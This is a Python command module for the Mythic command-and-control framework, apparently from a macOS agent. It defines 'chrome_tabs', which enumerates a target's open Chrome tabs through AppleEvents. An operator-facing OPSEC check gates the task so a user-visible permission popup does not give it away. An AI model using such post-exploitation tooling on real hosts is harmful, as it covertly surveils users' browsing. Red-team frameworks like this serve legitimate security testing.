from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class ChromeTabsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ChromeTabsCommand(CommandBase):
    cmd = "chrome_tabs"
    needs_admin = False
    help_cmd = "chrome_tabs"
    description = "This uses AppleEvents to list information about all of the open tabs in all of the open Chrome instances. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome tabs as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running. In Mojave this will cause a popup the first time asking for permission for your process to access Chrome."
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1010", "T1059.002", "T1559"]
    argument_class = ChromeTabsArguments

    async def opsec_pre(self, taskData: PTTaskMessageAllData) -> PTTTaskOPSECPreTaskMessageResponse:
        tasks = await SendMythicRPCTaskSearch(MythicRPCTaskSearchMessage(
            TaskID=taskData.Task.ID,
            SearchHost=taskData.Callback.Host,
            SearchCommandNames=[self.cmd]
        ))
        response = PTTTaskOPSECPreTaskMessageResponse(
            TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=False,
            OpsecPreBypassRole="operator",
            OpsecPreMessage="This could cause a popup between your current context and Google Chrome!",
        )
        found = False
        if tasks.Success:
            logger.info(tasks.Tasks)
            for t in tasks.Tasks:
                logger.info(t.to_json())
                if t.Completed:
                    found = True
                    response = PTTTaskOPSECPreTaskMessageResponse(
                        TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=False,
                        OpsecPreBypassRole="operator",
                        Error="Another instance already caused a popup, letting this one go",
                        OpsecPreMessage="This will cause a popup between your current context and Google Chrome!",
                    )
                    break
        else:
            found = True
            response = PTTTaskOPSECPreTaskMessageResponse(
                TaskID=taskData.Task.ID, Success=False, OpsecPreBlocked=True,
                OpsecPreBypassRole="operator",
                Error="Failed to search for tasks on this host",
                OpsecPreMessage="This will cause a popup between your current context and Google Chrome!",
            )
        if not found:
            response = PTTTaskOPSECPreTaskMessageResponse(
                TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=True,
                OpsecPreBypassRole="operator",
                OpsecPreMessage="This will cause a popup between your current context and Google Chrome!",
            )
        return response

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"Target Application of Chrome",
            BaseArtifactType="AppleEvent"
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
